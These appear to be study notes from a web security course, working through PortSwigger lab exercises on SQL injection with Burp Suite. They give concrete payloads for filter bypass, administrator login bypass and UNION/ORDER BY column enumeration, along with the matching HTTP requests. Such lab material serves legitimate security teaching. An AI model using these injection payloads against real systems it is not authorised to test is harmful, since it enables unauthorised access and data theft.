# Automated Exploitation Tools

```
    ___
   __H__
 ___ ___[']_____ ___ ___  {1.7.2}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

```

- **Web Application Hacker's Handbook**    
Chapter 9 - Attacking Data Stores

- **Web Security Academy**  
[https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

- **OWASP SQL Injection**   
[https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

- **OWASP SQL Injection Prevention Cheat Sheet**  
[https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

- **Pentest Monkey**  
[https://pentestmonkey.net/category/cheat-sheet/sql-injection](https://pentestmonkey.net/category/cheat-sheet/sql-injection)

- **Web Application Vulnerability Scanners** (WAVS)
(black-box):
Arachni, Wapiti, Acunetix, W3af.

# Instructor's Lab Setup

- Kali Linux running in VMWare inside macOS. In Kali Linux:

    - Burp Suite Community Edition (Pre-installed in Kali).
    - Visual Studio Code (free installation).
    - FoxyProxy Firefox extension (free installation).
    - The labs are on **Web Security Academy**.

## Burp Suite Community Edition

Proxy tab > Open Browser (built-in).

### Lab 1. SQLi Vulnerability in WHERE clause allowing retrieval of hidden data

- Product category filter

```sql
SELECT * FROM products WHERE category = 'Gifts'
AND released = 1;
```

End goal: display all products both released and unreleased.

Payload: `web-security-academy.net/filter?category=Gifts`

### Submit various payloads and watch the behavior:

1. ?category= `'`

```sql
SELECT * FROM products WHERE category = ''' AND released = 1
-- Internal Server Error. This may indicate a SQL injection vulnerability
```

2. ?category= `'--`

```sql
SELECT * FROM products WHERE category = ''--' AND released = 1 ---> No web page error, good sign.
```

3. ?category= `' OR 1=1 --`  
The first single quote (') acts as the closing quote in the
SQL statement, whereas the `--` cancels out the
`released = 1` validation-

```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1 
```

SUCCESS!

> The Burp Suite (written in Java, by the way) acts as an 
intermediary between the browser and the web server where
the application is hosted.

- **FoxyProxy** allows you to enable proxies by patterns and
order with the Burp suite:

(_Edit Proxy Burp_)

Proxy Type ---> HTTP  
Proxy IP address or DNS name ---> 127.0.0.1  
Port ---> 8080  
Username ---> username  
Password ---> pswd

Proxy > Send to Repeater > Repeater > RAW:

```
GET /filter?category=Accessories HTTP/1.1
Host: ...
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0)
Gecko/20100101 Firefox/78.0
Accept:
text/html, application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US, en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: (this is the target URL)
https://...web-security-academy.net/
Cookie: session=mc1241r398ygei8u912urgf
Upgrade-Insecure-Requests:1
```

By using FoxyProxy + Burp, we are able to track the **URI**:
`/filter?category=`

```python
r = request.get(url + uri + payload)
```

> Go to: Python script = sqli-lab-01.py

# Lab 2. SQLi allowing Login Bypass

End goal: perform a SQL injection attack and log in as
the 'administrator' user.

Username _____________  
Password _____________

- Payload 1  
Username = `admin`  
Password = `admin`  
"Invalid username or password" (this is good, since the
application won't give out the usernames)

- Payload 2  
Username = `'`   
Password =  
" Interal Server Error" -> This is a sign that the app
might be vulnerable to SQL injection.

- Payload 3   
Username = `admin'--`  
Password =  
"Invalid username or password"

- Payload 4   
Username = `administrator'--`  
Password =  
SUCCESSFUL LOGIN.

Possible resulting query:

```sql
SELECT firstname FROM users 
WHERE username = 'administrator'--' AND password = ''
```

Using the Burp Suite, we find out that when trying to login, the URI is:  
`/login` via POST

CSRF = Cross-Site Request Forgery

CSRF TOKEN > Send to Repeater

`csrf=Rpe55pf2gb943uhbr&username=admin&password=admin`

- Validate whether the application cares whether you remove
the CSRF token or not. In this case, if you remove it,
you get a "400" response.

"Missing parameter 'csrf'"

```html
<section>
    <form class=login-form method=POST action=/login>
        <input required type="hidden" name="csrf" value="Rp3ascasc">
        <!-- ... -->
</section>
```

> Go to: Python script = sqli-lab-02.py

# Lab 3. SQLi UNION attack

Determining the number of columns returned by the query.

SQLi: Product category filter.

**End goal**: Determine the number of columns that are being
returned by the query, by performing an SQLi UNION attack
that returns an additional row containing NULL values.

```sql
-- UNION refresher:
SELECT col1, col2, col3
FROM tbl1
    UNION 
-- 1. Same number and order of columns
-- 2. The data types must be compatible
SELECT col1, col2, col3
FROM tbl2 
;
```

In future labs, we will be able to have a query like this:
```sql
SELECT p1, p2
FROM tbl_products
-- Malicious payload:
    UNION
SELECT usernames, passwords
FROM tbl_users
;
```

### SQL Attack Analysis:

SQLi attack with `UNION` clause:

```sql
-- If you want to find out how many columns a table has:
SELECT *
FROM tbl_products
    UNION
SELECT NULL, NULL, NULL -- Until you find the correct number
FROM DUAL
;
```

SQLi attack with `ORDER BY` clause:

```sql
SELECT a,b FROM tbl PRODUCTS
ORDER BY 4 -- Try 1, 2, 3, ... until you get an error
;
```

Payload 1: `?category='` -> 500 Internal Server Error

Payload 2: `?category='--` -> 200

Payload 3: `?category=Gifts' UNION SELECT NULL --`

> Burp Suite -> Intercept -> Send to Repeater.

| REQUEST | RESPONSE |  
(Raw)

`GET /filter?category=Gifts'+UNION+select+NULL,+NULL,+NULL--`

Number of columns = 3

Payload 4 (second strategy):  

`GET /filter?category=Gifts'ORDER BY 4--`